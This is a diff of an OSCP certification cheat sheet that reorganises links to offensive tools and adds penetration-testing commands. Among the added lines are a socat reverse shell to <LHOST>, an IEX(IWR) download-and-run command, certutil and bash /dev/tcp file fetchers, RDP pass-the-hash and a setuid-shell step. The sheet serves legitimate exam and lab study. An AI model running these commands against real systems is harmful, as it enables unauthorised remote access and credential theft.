@@ -34,74 +34,130 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 - [Commands](https://github.com/0xsyr0/OSCP#commands)
 	- [Basics](https://github.com/0xsyr0/OSCP#basics-1)
 		- [CentOS](https://github.com/0xsyr0/OSCP#centos)
-		- [Certutil](https://github.com/0xsyr0/OSCP#certutil)
+		- [curl](https://github.com/0xsyr0/OSCP#curl)
 		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
+		- [dir](https://github.com/0xsyr0/OSCP#dir)
+		- [Environment Variables](https://github.com/0xsyr0/OSCP#environment-variables)
+		- [File Transfer](https://github.com/0xsyr0/OSCP#file-transfer)
 		- [gcc](https://github.com/0xsyr0/OSCP#gcc)
-		- [Netcat](https://github.com/0xsyr0/OSCP#netcat)
+		- [getfacl](https://github.com/0xsyr0/OSCP#getfacl)
+		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
 		- [PHP Webserver](https://github.com/0xsyr0/OSCP#php-webserver)
 		- [Ping](https://github.com/0xsyr0/OSCP#ping)
 		- [Python Webserver](https://github.com/0xsyr0/OSCP#python-webserver)
 		- [RDP](https://github.com/0xsyr0/OSCP#rdp)
+		- [regedit](https://github.com/0xsyr0/OSCP#regedit)
+		- [showmount](https://github.com/0xsyr0/OSCP#showmount)
+		- [smbclient](https://github.com/0xsyr0/OSCP#smbclient)
+		- [socat](https://github.com/0xsyr0/OSCP#socat)
 		- [SSH](https://github.com/0xsyr0/OSCP#ssh)
+		- [Time and Date](https://github.com/0xsyr0/OSCP#time-and-date)
 		- [tmux](https://github.com/0xsyr0/OSCP#tmux)
 		- [Upgrading Shells](https://github.com/0xsyr0/OSCP#upgrading-shells)
 		- [vi](https://github.com/0xsyr0/OSCP#vi)
+		- [VirtualBox](https://github.com/0xsyr0/OSCP#virtualbox)
+		- [virtualenv](https://github.com/0xsyr0/OSCP#virtualenv)
 		- [Windows Command Formatting](https://github.com/0xsyr0/OSCP#windows-command-formatting)
 	- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering-1)
 		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
-		- [DNS](https://github.com/0xsyr0/OSCP#dns)
+		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
+		- [BloodHound Python](https://github.com/0xsyr0/OSCP#bloodhound-python)
+		- [Certify](https://github.com/0xsyr0/OSCP#certify)
+		- [enum4linux-ng](https://github.com/0xsyr0/OSCP#enum4linux-ng)
 		- [ldapsearch](https://github.com/0xsyr0/OSCP#ldapsearch)
-		- [sslyze](https://github.com/0xsyr0/OSCP#sslyze)
-		- [SMB / NetBIOS](https://github.com/0xsyr0/OSCP#smb--netbios)
-		- [JAWS](https://github.com/0xsyr0/OSCP#jaws)
-	- [Vulnerability Analysis](https://github.com/0xsyr0/OSCP#vulnerability-analysis-1)
-		- [finger](https://github.com/0xsyr0/OSCP#finger)
-		- [Nuclei](https://github.com/0xsyr0/OSCP#nuclei)
+		- [memcached](https://github.com/0xsyr0/OSCP#memcached)
+		- [NetBIOS](https://github.com/0xsyr0/OSCP#netbios)
+		- [rpcclient](https://github.com/0xsyr0/OSCP#rpcclient)
 	- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis-1)
-		- [Asset Discovery](https://github.com/0xsyr0/OSCP#asset-discovery)
+		- [Burp Suite](https://github.com/0xsyr0/OSCP#burp-suite)
 		- [ffuf](https://github.com/0xsyr0/OSCP#ffuf)
 		- [Gobuster](https://github.com/0xsyr0/OSCP#gobuster)
-		- [Hakrawler](https://github.com/0xsyr0/OSCP#hakrawler)
-		- [Local File Inclusion LFI()](https://github.com/0xsyr0/OSCP#local-file-inclusion-lfi)
+    - [GitTools](https://github.com/0xsyr0/OSCP#gittools)
+		- [Local File Inclusion (LFI)](https://github.com/0xsyr0/OSCP#local-file-inclusion-lfi)
+		- [PDF PHP Inclusion](https://github.com/0xsyr0/OSCP#pdf-php-inclusion)
+		- [PHP Upload Filter Bypasses](https://github.com/0xsyr0/OSCP#php-upload-filter-bypasses)
+		- [PHP Filter Chain Generator](https://github.com/0xsyr0/OSCP#php-filter-chain-generator)
+		- [PHP Generic Gadget Chains (PHPGGC)](https://github.com/0xsyr0/OSCP#php-generic-gadget-chains-phpgcc)
+		- [Server-Side Request Forgery (SSRF)](https://github.com/0xsyr0/OSCP#server-side-request-forgery-ssrf)
+		- [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/OSCP#server-side-template-injection-ssti)
+		- [Upload Vulnerabilities](https://github.com/0xsyr0/OSCP#upload-vulnerabilities)
 		- [wfuzz](https://github.com/0xsyr0/OSCP#wfuzz)
 		- [WPScan](https://github.com/0xsyr0/OSCP#wpscan)
+		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)
+		- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/OSCP#cross-site-scripting-xss)
 	- [Database Analysis](https://github.com/0xsyr0/OSCP#database-analysis)
-		- [Basic Commands](https://github.com/0xsyr0/OSCP#basic-commands)
+		- [MongoDB](https://github.com/0xsyr0/OSCP#mongodb)
+		- [MSSQL](https://github.com/0xsyr0/OSCP#mssql)
+		- [MySQL](https://github.com/0xsyr0/OSCP#mysql)
+		- [NoSQL Injection](https://github.com/0xsyr0/OSCP#nosql-injection)
+		- [PostgreSQL](https://github.com/0xsyr0/OSCP#postgresql)
+		- [Redis](https://github.com/0xsyr0/OSCP#redis)
+		- [sqlcmd](https://github.com/0xsyr0/OSCP#sqlcmd)
 		- [SQL Injection](https://github.com/0xsyr0/OSCP#sql-injection)
-		- [sqsh](https://github.com/0xsyr0/OSCP#sqsh)
 		- [SQL Truncation Attack](https://github.com/0xsyr0/OSCP#sql-truncation-attack)
-		- [XPATH Injection](https://github.com/0xsyr0/OSCP#xpath-injection)
+		- [sqlite3](https://github.com/0xsyr0/OSCP#sqlite3)
+		- [sqsh](https://github.com/0xsyr0/OSCP#sqsh)
 	- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks-1)
+		- [CrackMapExec](https://github.com/0xsyr0/OSCP#crackmapexec)
 		- [fcrack](https://github.com/0xsyr0/OSCP#fcrack)
-		- [LaZagne](https://github.com/0xsyr0/OSCP#lazagne)
+		- [hashcat](https://github.com/0xsyr0/OSCP#hashcat)
 		- [Hydra](https://github.com/0xsyr0/OSCP#hydra)
 		- [John](https://github.com/0xsyr0/OSCP#john)
+		- [Kerbrute](https://github.com/0xsyr0/OSCP#kerbrute)
+		- [LaZagne](https://github.com/0xsyr0/OSCP#lazagne)
+		- [mimikatz](https://github.com/0xsyr0/OSCP#mimikatz)
+		- [pypykatz](https://github.com/0xsyr0/OSCP#pypykatz)
 	- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools-1)
-		- [ImageTragick Polyglot Attack](https://github.com/0xsyr0/OSCP#imagetragick-polyglot-attack)
+		- [ImageTragick](https://github.com/0xsyr0/OSCP#imagetragick)
+		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
 		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
-		- [ShellShock](https://github.com/0xsyr0/OSCP#shellshock)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
 		- [AppLocker Bypass List](https://github.com/0xsyr0/OSCP#applocker-bypass-list)
 		- [autologon](https://github.com/0xsyr0/OSCP#autologon)
 		- [Bash Privilege Escalation](https://github.com/0xsyr0/OSCP#bash-privilege-escalation)
 		- [Basic Linux Enumeration](https://github.com/0xsyr0/OSCP#basic-linux-enumeration)
 		- [Basic Windows Enumeration](https://github.com/0xsyr0/OSCP#basic-windows-enumeration)
+		- [Credential Files](https://github.com/0xsyr0/OSCP#credential-files)
 		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
 		- [find Commands](https://github.com/0xsyr0/OSCP#find-commands)
 		- [grep for Passwords](https://github.com/0xsyr0/OSCP#grep-for-passwords)
 		- [Impacket](https://github.com/0xsyr0/OSCP#impacket)
-		- [Juicy Potato](https://github.com/0xsyr0/OSCP#juicy-potato)
-		- [SharpEfsPotato](https://github.com/0xsyr0/OSCP#sharpefspotato)
+		- [Internet Information Service (IIS)](https://github.com/0xsyr0/OSCP#internet-information-service-iis)
+		- [JAWS](https://github.com/0xsyr0/OSCP#jaws)
+		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
+		- [LD_Preload](https://github.com/0xsyr0/OSCP#ld_preload)
+		- [Linux Wildcards](https://github.com/0xsyr0/OSCP#linux-wildcards)
+		- [logrotten](https://github.com/0xsyr0/OSCP#logrotten)
+		- [Lsass](https://github.com/0xsyr0/OSCP#lsass)
+		- [Path Variable Hijacking](https://github.com/0xsyr0/OSCP#path-variable-hijacking)
 		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
+		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
+		- [regedit](https://github.com/0xsyr0/OSCP#regedit)
+		- [Rubeus](https://github.com/0xsyr0/OSCP#rubeus)
+		- [RunasCs](https://github.com/0xsyr0/OSCP#runascs)
+		- [SeBackup and SeRestore Privilege](https://github.com/0xsyr0/OSCP#sebackup-and-serestore-privilege)
+		- [SeBackupPrivilege Privilege Escalation (diskshadow)](https://github.com/0xsyr0/OSCP#sebackupprivilege-privilege-escalation-diskshadow)
+		- [SeTakeOwnership Privilege](https://github.com/0xsyr0/OSCP#setakeownership-privilege)
+		- [SeImpersonate and SeAssignPrimaryToken Privilege](https://github.com/0xsyr0/OSCP#seimpersonate-and-seassignprimarytoken-privilege)
+		- [Unquoted Service Paths](https://github.com/0xsyr0/OSCP#unquoted-service-paths)
 		- [Windows Tasks & Services](https://github.com/0xsyr0/OSCP#windows-tasks--services)
 		- [Writeable Directories in Linux](https://github.com/0xsyr0/OSCP#writeable-directories-in-linux)
+		- [writeDACL](https://github.com/0xsyr0/OSCP#writedacl)
 	- [CVE](https://github.com/0xsyr0/OSCP#cve)
+		- [Dirty Pipe (CVE-2022-0847)](https://github.com/0xsyr0/OSCP#dirty-pipe-cve-2022-0847)
 		- [Juicy Potato](https://github.com/0xsyr0/OSCP#juicy-potato)
+		- [Log4j / Log4Shell (CVE-2021-44228)](https://github.com/0xsyr0/OSCP#log4j--log4shell-cve2021-44228)
 		- [SharpEfsPotato](https://github.com/0xsyr0/OSCP#sharpefspotato)
+		- [ShellShock](https://github.com/0xsyr0/OSCP#shellshock)
+		- [Shocker](https://github.com/0xsyr0/OSCP#shocker)
 	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
+		- [Donut](https://github.com/0xsyr0/OSCP#donut)
+		- [Exiftool](https://github.com/0xsyr0/OSCP#exiftool)
+		- [GhostScript](https://github.com/0xsyr0/OSCP#ghostscript)
 		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
 		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
 		- [nishang](https://github.com/0xsyr0/OSCP#nishang)
+		- [ScareCrow](https://github.com/0xsyr0/OSCP#scarecrow)
 		- [Shikata Ga Nai](https://github.com/0xsyr0/OSCP#shikata-ga-nai)
 		- [ysoserial](https://github.com/0xsyr0/OSCP#ysoserial)
 	- [Templates](https://github.com/0xsyr0/OSCP#templates)
@@ -109,23 +165,31 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [Bad YAML](https://github.com/0xsyr0/OSCP#bad-yaml)
 		- [Exploit Skeleton Python Script](https://github.com/0xsyr0/OSCP#exploit-skeleton-python-script)
 		- [JSON POST Rrequest](https://github.com/0xsyr0/OSCP#json-post-request)
+		- [Python Pickle RCE](https://github.com/0xsyr0/OSCP#python-pickle-rce)
+		- [Python Redirect for SSRF](https://github.com/0xsyr0/OSCP#python-redirect-for-ssrf)
+		- [Python Web Request](https://github.com/0xsyr0/OSCP#python-web-request)
+		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)
 
 ### Basics
 
 | Name | URL |
 | --- | --- |
+| Chisel | https://github.com/jpillora/chisel |
 | Swaks | https://github.com/jetmore/swaks |
-| CyberChef | https://gchq.github.io/CyberChef/ |
+| CyberChef | https://gchq.github.io/CyberChef |
 
 ### Information Gathering
 
 | Name | URL |
 | --- | --- |
 | Nmap | https://github.com/nmap/nmap |
-| pspy | https://github.com/DominicBreuker/pspy |
-| enum4linux | https://github.com/CiscoCXSecurity/enum4linux |
+| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
+| BloodHound Docker | https://github.com/belane/docker-bloodhound |
 | BloodHound Python | https://github.com/fox-it/BloodHound.py |
+| pspy | https://github.com/DominicBreuker/pspy |
+| RustHound | https://github.com/OPENCYBER-FR/RustHound |
+| SharpHound | https://github.com/BloodHoundAD/SharpHound |
 
 ### Vulnerability Analysis
 
@@ -138,15 +202,22 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 
 | Name | URL |
 | --- | --- |
-| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
-| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
-| ysoserial | https://github.com/frohoff/ysoserial |
-| JSON Web Tokens | https://jwt.io/ |
-| httpx | https://github.com/projectdiscovery/httpx |
+| WPScan | https://github.com/wpscanteam/wpscan |
+| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
 | Gobuster | https://github.com/OJ/gobuster |
 | ffuf | https://github.com/ffuf/ffuf |
 | Wfuzz | https://github.com/xmendez/wfuzz |
-| WPScan | https://github.com/wpscanteam/wpscan |
+| httpx | https://github.com/projectdiscovery/httpx |
+| JSON Web Tokens | https://jwt.io |
+| JWT_Tool | https://github.com/ticarpi/jwt_tool |
+| fpmvuln | https://github.com/hannob/fpmvuln |
+| PHPGGC | https://github.com/ambionics/phpggc |
+| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
+| ysoserial | https://github.com/frohoff/ysoserial |
+| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
+| Weird Proxies | https://github.com/GrrrDog/weird_proxies |
+| SSRF testing resources | https://github.com/cujanovic/SSRF-Testing |
+| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
 
 ### Password Attacks
 
@@ -169,6 +240,9 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 
 | Name | URL |
 | --- | --- |
+| binwalk | https://github.com/ReFirmLabs/binwalk |
+| ImHex | https://github.com/WerWolv/ImHex |
+| JD-GUI | https://github.com/java-decompiler/jd-gui |
 | dnSpy | https://github.com/dnSpy/dnSpy |
 | AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
 | ghidra | https://github.com/NationalSecurityAgency/ghidra |
@@ -177,25 +251,22 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | Radare2 | https://github.com/radareorg/radare2 |
 | GEF | https://github.com/hugsy/gef |
 | peda | https://github.com/longld/peda |
-| JD-GUI | https://github.com/java-decompiler/jd-gui |
 
 ### Exploitation Tools
 
 | Name | URL |
 | --- | --- |
-| lsassy | https://github.com/Hackndo/lsassy |
-| Rubeus | https://github.com/GhostPack/Rubeus |
-| printspoofer | https://github.com/dievus/printspoofer |
-| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
+| ImageTragick | https://imagetragick.com |
+| MSL / Polyglot Attack | https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html |
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
-| SharpCollection | https://github.com/Flangvik/SharpCollection |
-| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
+
 
 ### Post Exploitation
 
 | Name | URL |
 | --- | --- |
+| pwncat | https://github.com/calebstewart/pwncat |
 | PEASS-ng | https://github.com/carlospolop/PEASS-ng |
 | LinEnum | https://github.com/rebootuser/LinEnum |
 | JAWS | https://github.com/411Hall/JAWS |
@@ -203,13 +274,26 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | WESNG | https://github.com/bitsadmin/wesng
 | Sherlock | https://github.com/rasta-mouse/Sherlock |
 | scavenger | https://github.com/SpiderLabs/scavenger |
-| RunasCs | https://github.com/antonioCoco/RunasCs |
 | WADComs | https://wadcoms.github.io |
-| GTFOBins | https://gtfobins.github.io/ |
-| LOLBAS | https://lolbas-project.github.io/ |
+| GTFOBins | https://gtfobins.github.io |
+| LOLBAS | https://lolbas-project.github.io |
+| lsassy | https://github.com/Hackndo/lsassy |
+| PPLdump | https://github.com/itm4n/PPLdump |
+| nanodump | https://github.com/helpsystems/nanodump |
+| LAPSDumper | https://github.com/n00py/LAPSDumper |
+| Certipy | https://github.com/ly4k/Certipy |
+| Whisker | https://github.com/eladshamir/Whisker |
+| PyWhisker | https://github.com/ShutdownRepo/pywhisker |
+| Rubeus | https://github.com/GhostPack/Rubeus |
+| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
 | Impacket | https://github.com/fortra/impacket |
+| RunasCs | https://github.com/antonioCoco/RunasCs |
+| Villain | https://github.com/t3l3machus/Villain |
 | powercat | https://github.com/besimorhino/powercat |
+| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
 | PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
+| SharpCollection | https://github.com/Flangvik/SharpCollection |
+| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
 | Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
 | Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
 | Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
@@ -283,6 +367,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | n/a | SystemNightmare | https://github.com/GossiTheDog/SystemNightmare |
 | n/a | PetitPotam | https://github.com/topotam/PetitPotam |
 | n/a | DFSCoerce MS-DFSNM Exploit | https://github.com/Wh04m1001/DFSCoerce |
+| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub 
 | n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
 | n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |
 
@@ -300,29 +385,39 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 
 | Name | URL |
 | --- | --- |
-| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
-| Payload Box | https://github.com/payloadbox |
-| ysoserial | https://github.com/frohoff/ysoserial |
+| phpgcc | https://github.com/ambionics/phpggc |
+| unicorn | https://github.com/trustedsec/unicorn |
 | nishang | https://github.com/samratashok/nishang |
 | Shikata Ga Nai | https://github.com/EgeBalci/sgn |
-| unicorn | https://github.com/trustedsec/unicorn |
+| Veil | https://github.com/Veil-Framework/Veil |
+| Donut | https://github.com/TheWover/donut |
+| Freeze | https://github.com/optiv/Freeze |
+| ScareCrow | https://github.com/optiv/ScareCrow |
 | PowerLine | https://github.com/fullmetalcache/powerline |
 | woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
 | marshalsec | https://github.com/mbechler/marshalsec |
+| ysoserial | https://github.com/frohoff/ysoserial |
+| ysoserial.net | https://github.com/pwntester/ysoserial.net |
 | AMSI.fail | http://amsi.fail |
-| Raikia's Hub | https://raikia.com/tool-powershell-encoder/ |
+| hoaxshell | https://github.com/t3l3machus/hoaxshell |
+| Invoke-Obfuscation | https://github.com/danielbohannon/Invoke-Obfuscation |
+| Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
 | webshell | https://github.com/tennc/webshell |
 | Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
 | PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
+| Payload Box | https://github.com/payloadbox |
+| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
 
 ### Wordlists
 
 | Name | URL |
 | --- | --- |
-| SecLists | https://github.com/danielmiessler/SecLists |
 | CeWL | https://github.com/digininja/cewl |
 | CUPP | https://github.com/Mebus/cupp |
 | COOK | https://github.com/giteshnxtlvl/cook |
+| bopscrk | https://github.com/R3nt0n/bopscrk |
+| Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
+| SecLists | https://github.com/danielmiessler/SecLists |
 
 ### Social Media Resources
 
@@ -345,26 +440,143 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 doas -u <USERNAME> /bin/sh
 ```
 
-#### Certutil
+#### curl
+
+```c
+curl -v http://<RHOST>
+curl -k <RHOST>
+curl -X POST http://<RHOST>
+curl -I POST http://<RHOST>
+curl -X PUT http://<RHOST>
+curl -vvv <RHOST>
+curl --head http://<RHOST>/
+curl --proxy http://127.0.0.1:8080
+curl -X POST http://<RHOST>/select --data 'db=whatever|id'
+curl --path-as-is http://<RHOST>/../../../../../../etc/passwd
+curl -s "http://<RHOST>/reports.php?report=2589" | grep Do -A8 | html2text
+```
+
+#### Chisel
+
+##### Reverse Pivot
+
+```c
+./chisel server -p 9002 -reverse -v
+./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888
+```
+
+##### SOCKS5 / Proxychains Configuration
+
+```c
+./chisel server -p 9002 -reverse -v
+./chisel client <RHOST>:9002 R:socks
+```
+
+#### dir
+
+```c
+dir flag* /s /p
+dir /s /b *.log
+```
+
+#### Environment Variables
+
+```c
+export PATH=`pwd`:$PATH
+```
+
+#### File Transfer
+
+##### Certutil
 
 ```c
 certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```
 
-#### Chisel
-
-##### Chisel Socks Proxy
+##### Netcat
 
 ```c
-./chisel server -p 9002 -reverse -v
-./chisel client <RHOST>:9002 R:1080:socks
+nc -lnvp <LPORT> < <FILE>
+nc <RHOST> <RPORT> > <FILE>
 ```
 
-##### Chisel Port Forwarding
+##### Impacket
 
 ```c
-./chisel server -p 9002 -reverse -v
-./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888
+sudo python3 impacket/examples/smbserver.py <SHARE> ./
+sudo impacket-smbserver <SHARE> . -smb2support
+```
+
+```c
+copy * \\<LHOST>\<SHARE>
+powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
+IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing)
+```
+
+##### Bash only
+
+###### wget version
+
+Paste directly to the shell.
+
+```c
+function __wget() {
+    : ${DEBUG:=0}
+    local URL=$1
+    local tag="Connection: close"
+    local mark=0
+
+    if [ -z "${URL}" ]; then
+        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
+               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
+        return 1;
+    fi
+    read proto server path <<<$(echo ${URL//// })
+    DOC=/${path// //}
+    HOST=${server//:*}
+    PORT=${server//*:}
+    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
+    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
+    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"
+
+    exec 3<>/dev/tcp/${HOST}/$PORT
+    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
+    while read line; do
+        [[ $mark -eq 1 ]] && echo $line
+        if [[ "${line}" =~ "${tag}" ]]; then
+            mark=1
+        fi
+    done <&3
+    exec 3>&-
+}
+```
+
+```c
+__wget http://<LHOST>/<FILE>
+```
+
+###### curl version
+
+```c
+function __curl() {
+  read proto server path <<<$(echo ${1//// })
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  (while read line; do
+   [[ "$line" == $'\r' ]] && break
+  done && cat) <&3
+  exec 3>&-
+}
+```
+
+```c
+__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
 
 #### gcc
@@ -375,11 +587,26 @@ i686-w64-mingw32-gcc -o main32.exe main.c
 x86_64-w64-mingw32-gcc -o main64.exe main.c
 ```
 
-#### Netcat
+#### getfacl
 
 ```c
-nc -lnvp <LPORT> < <FILE>
-nc <RHOST> <RPORT> > <FILE>
+getfacl <LOCAL_DIRECTORY>
+```
+
+#### Kerberos
+
+```c
+/etc/krb5.conf                   // kerberos configuration file location
+kinit <USERNAME>                 // creating ticket request
+klist                            // show available kerberos tickets
+kdestroy                         // delete cached kerberos tickets
+.k5login                         // resides kerberos principals for login (place in home directory)
+krb5.keytab                      // "key table" file for one or more principals
+kadmin                           // kerberos administration console
+add_principal <EMAIL>            // add a new user to a keytab file
+ksu                              // executes a command with kerberos authentication
+klist -k /etc/krb5.keytab        // lists keytab file
+kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
 ```
 
 #### PHP Webserver
@@ -406,7 +633,53 @@ sudo python3 -m http.server 80
 
 ```c
 xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
+xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /h:1010 /w:1920
 rdesktop <RHOST>
+```
+
+#### showmount
+
+```c
+/usr/sbin/showmount -e <RHOST>
+sudo showmount -e <RHOST>
+chown root:root sid-shell; chmod +s sid-shell
+```
+
+#### smbclient
+
+```c
+smbclient -L ////<RHOST>/ -N
+smbclient //<RHOST>/<FOLDER> -N
+smbclient \\\\<RHOST>/<FOLDER> -N
+smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
+smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
+smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
+smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
+```
+
+##### Download multiple files at once
+
+```c
+mask""
+recurse ON
+prompt OFF
+mget *
+```
+
+#### socat
+
+```c
+socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
+```
+
+```c
+socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
+```
+
+```c
+socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
+socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
 ```
 
 #### SSH
@@ -421,6 +694,46 @@ ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>
 ssh -L 80:<LHOST>:80 <RHOST>
 ssh -L 127.0.0.1:80:<LHOST>:80 <RHOST>
 ssh -L 80:localhost:80 <RHOST>
+```
+
+#### Time and Date
+
+##### Get the Server Time
+
+```c
+sudo nmap -sU -p 123 --script ntp-info <RHOST>
+```
+
+##### Stop virtualbox-guest-utils to stop syncing Time
+
+```c
+sudo /etc/init.d/virtualbox-guest-utils stop
+```
+
+##### Disable automatic Sync
+
+```c
+sudo systemctl disable --now chronyd
+```
+
+##### Options to set the Date and Time
+
+```c
+sudo net time -c <RHOST>
+sudo net time set -S <RHOST>
+sudo ntpdate -b -u <RHOST>
+sudo timedatectl set-timezone UTC
+sudo timedatectl list-timezones
+sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
+sudo timedatectl set-time 15:58:30
+sudo timedatectl set-time '2015-11-20 16:14:50'
+sudo timedatectl set-local-rtc 1
+```
+
+##### Keep in Sync with a Server
+
+```c
+while [ 1 ]; do sudo ntpdate <RHOST>;done
 ```
 
 #### tmux
@@ -473,6 +786,26 @@ export XTERM=xterm
 :w !sudo tee %    # save file with elevated privileges without exiting
 ```
 
+#### VirtualBox
+
+```c
+sudo pkill VBoxClient && VBoxClient --clipboard
+```
+
+#### virtualenv
+
+```c
+sudo apt-get install virtualenv
+virtualenv -p python2.7 venv
+. venv/bin/activate
+```
+
+```c
+python.exe -m pip install virtualenv
+python.exe -m virtualenv venv
+venv\Scripts\activate
+```
+
 #### Windows Command Formatting
 
 ```c
@@ -484,27 +817,59 @@ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 #### Nmap
 
 ```c
-sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>    # discovery scan
-sudo nmap -A -T4 -sC -sV --script vuln <RHOST>    # vulnerability scan
-sudo nmap -sU <RHOST>    # udp scan
-sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>    # delayed scan
-sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>    # kerberos enumeration
+sudo nmap -A -T4 -sC -sV -p- <RHOST>
+sudo nmap -sV -sU <RHOST>
+sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
+sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
+sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
+sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
 ls -lh /usr/share/nmap/scripts/*ssh*
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 ```
 
-#### DNS
-
-##### Reverse DNS
+#### BloodHound
 
 ```c
-whois <RHOST>
-host <RHOST> <RHOST>
